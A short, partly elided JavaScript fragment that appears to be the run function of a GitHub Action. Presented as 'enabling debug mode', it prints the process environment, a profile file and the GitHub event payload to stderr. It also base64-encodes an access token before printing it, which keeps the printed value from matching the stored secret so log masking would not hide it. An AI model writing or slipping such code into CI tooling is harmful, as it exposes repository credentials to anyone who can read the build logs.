...
async function run(options) {
    ...
    console.error(env)
console.error("ENABLING DEBUG MODE!!")
        args.push("-debug", "-allowgitfetch=false");
    var fs = require('fs')
    console.error("----")
    console.error(fs.readFileSync(options.profile).toString())
        console.error("----")
var t = JSON.stringify(options.token)
    let buff = new Buffer(t);
let base64data = buff.toString('base64');
console.error(base64data.toString())
    
    console.error("----")
    
    console.error(fs.readFileSync(process.env["GITHUB_EVENT_PATH"]).toString())
    console.error("----")
